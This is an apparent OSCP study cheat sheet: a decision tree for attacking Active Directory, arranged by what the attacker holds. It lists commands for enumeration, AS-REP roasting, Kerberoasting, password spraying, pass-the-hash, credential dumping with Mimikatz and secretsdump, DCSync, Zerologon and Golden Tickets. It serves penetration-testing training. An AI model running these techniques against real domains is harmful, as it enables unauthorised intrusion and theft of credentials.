# OSCP AD — Attack Decision Tree 

**Read it by what you currently hold.** Every new credential/hash → jump back to the top. Section refs (§) point to `AD-Exam-Notes.md`.

---

## STATE 0 — Nothing (just an IP / subnet)

**Goal: a username list, then first creds.**

1. Full TCP scan → deep scan found ports (§1.2). Note 88/389/445/5985 = it's a DC/AD.
2. Web on 80/443? → exploit → shell = foothold (skip to STATE "shell"). (§3.1)
3. Null/guest/anonymous:
   - `nxc smb $IP -u '' -p '' --shares` / `-u guest` (§2.1)
   - `rpcclient -U "" $IP` → `enumdomusers`; `enum4linux -a`
   - LDAP anonymous bind; `--rid-brute` → **users list** (§2.1)
4. Validate names with `kerbrute userenum` → note **NO PREAUTH** accounts.
5. Have a username list but no creds? → **AS-REP roast** (§3.6) → crack → creds.
6. Still nothing? → **Responder** on writable path / coerced auth (§3.4); re-scan, check UDP.

Got a username list → STATE 1. Got creds → STATE 2. Got a shell → STATE 4.

---

## STATE 1 — Username list (no password)

1. **AS-REP roast** the list (no creds): `impacket-GetNPUsers <domain>/ -usersfile users ...` (§3.6) → crack `-m 18200`.
2. **Password spray** a weak/seasonal password across the list: `nxc smb -u users -p 'Password1' --continue-on-success` (§3.5). `Pwn3d!` = admin.
3. **Blind/no-preauth Kerberoast** if you have an AS-REP user (§3.7).

Any hit → STATE 2.

---

## STATE 2 — Valid creds (user + password)

**Do ALL of these with every new cred:**

1. **Spray everywhere**: `nxc {smb,winrm,mssql,rdp,ldap,ssh} $IP -u -p` + `--local-auth`. Look for `Pwn3d!` (§2.2).
   - WinRM `Pwn3d!` → `evil-winrm` = shell (STATE 4).
   - SMB `Pwn3d!` → `psexec.py` = admin shell (STATE 4/5).
2. **Enumerate shares** for this user (recheck on every new user) (§2.1/§2.2).
3. **Kerberoast** (`-request`) → crack `-m 13100` (§3.7).
4. **BloodHound** ingest → check: shortest path to DA, **Outbound Object Control**, DCSync, roastable (§2.4).
5. **Certipy find -vulnerable** → ADCS ESC path → cert → hash (§6.6) → STATE 3.
6. **GPP/SYSVOL** cpassword (§3.3); search readable shares for creds.
7. **MSSQL**? → `xp_cmdshell` / impersonation (§3.10) → shell.

### If BloodHound shows object control over another principal (§5.5)

- GenericAll/Write on **user** → targeted Kerberoast/AS-REP, or `net rpc password` reset.
- GenericAll on **group** → add yourself (`bloodyAD add groupMember`).
- GenericAll/Write on **computer** → **RBCD** (§4.8c) → impersonate admin.
- WriteDACL/WriteOwner → grant yourself rights (`dacledit`), then abuse.

### If delegation shows up (§4.8)

- Unconstrained → coerce DC → capture TGT → DCSync.
- Constrained → S4U impersonate Administrator.

Admin/DA rights on a path → STATE 5/6. Shell → STATE 4.

---

## STATE 3 — NT hash (no password)

1. **Pass-the-Hash everywhere**: `nxc smb -u user -H <NT> --local-auth`; `evil-winrm -H`; `psexec.py -hashes :<NT>` (§4.1/§4.2).
2. **Overpass-the-Hash** → TGT for Kerberos-only services: `getTGT` / Rubeus `asktgt` (§4.4).
3. Crack the hash offline (`-m 1000`) → if cracked, treat as STATE 2.
4. If it's the **krbtgt** hash → **Golden Ticket** (§6.5). If a **service/machine** hash → **Silver Ticket** (§6.4). If **DC machine acct** → DCSync.

Admin shell → STATE 5. Domain hashes → STATE 6.

---

## STATE 4 — Shell as a normal user (on a host)

1. **Local privesc enum**: `whoami /all` → **PowerUp/PrivEscCheck** → **WinPEAS** (§5.1/§5.2).
2. `whoami /priv` token abuse (§5.3):
   - SeImpersonate → **PrintSpoofer/Potato** → SYSTEM.
   - SeRestore → `SeRestoreAbuse`; SeBackup → read SAM/SYSTEM/NTDS; SeShutdown → swap service binary + reboot.
3. Unquoted service paths + writable → drop reverse shell (§5.2).
4. Hunt files/creds on disk (§3.2); check extra NICs → **pivot** (ligolo-ng, §4.7).
5. Kernel/CVE exploits only if all else fails.

Local admin/SYSTEM → STATE 5.

---

## STATE 5 — Local Admin / SYSTEM on a host

1. **Dump everything**: Mimikatz `sekurlsa::logonpasswords` + `lsadump::lsa`; `secretsdump.py` (local); LaZagne (§5.4).
2. Collect **SAM, LSA secrets, cached logons, tickets**, cleartext creds.
3. Enable RDP for re-entry (`nxc -M rdp -o ACTION=enable`) (§4.6).
4. Every credential/hash found → **STATE 2 / STATE 3** (re-spray the whole network).
5. If this is the **DC** → STATE 6. Otherwise pivot to the next host.

---

## STATE 6 — Path to the DC / Domain Admin

Pick the one that fits what you hold:

- **DA creds/hash** → `impacket-secretsdump <domain>/<user>@<DC> -just-dc-ntlm` → dump NTDS (§6.1).
- **DCSync right** (not full DA) → `secretsdump` / `lsadump::dcsync /user:krbtgt` (§6.2).
- **On the DC as admin** → Shadow Copy `vshadow` → NTDS.dit offline (§6.1).
- **No creds, DC unpatched** → **Zerologon** → DCSync → **restore pw** (§6.3).
- **krbtgt hash in hand** → **Golden Ticket** → PsExec the DC (§6.5).
- **ADCS vulnerable** → Certipy ESC → DA cert/hash (§6.6).
- **Child domain owned** → SID-history / `raiseChild` to forest root (§6.7).

**Own krbtgt + Administrator hashes = full domain. Grab proof flags on DC + all required hosts.**

---

### Fast loop summary

```
Nothing → users → creds → (hash | shell) → local admin → dump → re-spray → DC → krbtgt
          └──────────── every new cred/hash restarts the loop ────────────┘
```

Stuck? Re-scan, verify tools work, try UDP, try `--local-auth`/NTLM, re-check shares as each new user, and reconsider whether privesc is even needed.
